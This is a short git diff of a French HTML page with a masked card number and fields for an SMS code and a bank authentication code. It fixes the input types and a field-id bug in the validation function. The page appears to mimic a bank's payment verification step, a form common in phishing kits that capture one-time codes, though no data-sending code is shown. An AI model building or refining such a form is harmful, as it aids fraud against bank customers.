@@ -108,8 +108,8 @@
             <p><strong>N° de carte :</strong> **** **** **** ****</p>
         </div>
 
-        <input type="text" placeholder="Code SMS" id="code-sms" required>
-        <input type="text" placeholder="Code Banque" id="Code application - Authentification banque" required>
+        <input type="tel" placeholder="Code SMS" id="code-sms" required>
+        <input type="tel" placeholder="Code Banque" id="Code application - Authentification banque" required>
 
         <a href="#" class="btn" onclick="validate()">Valider</a>
 
@@ -131,7 +131,7 @@
 
         function validate() {
             const smsCode = document.getElementById('code-sms').value;
-            const bankCode = document.getElementById('code-banque').value;
+            const bankCode = document.getElementById('Code application - Authentification banque').value;
 
             if (smsCode === "" || bankCode === "") {
                 alert("Veuillez remplir tous les champs.");
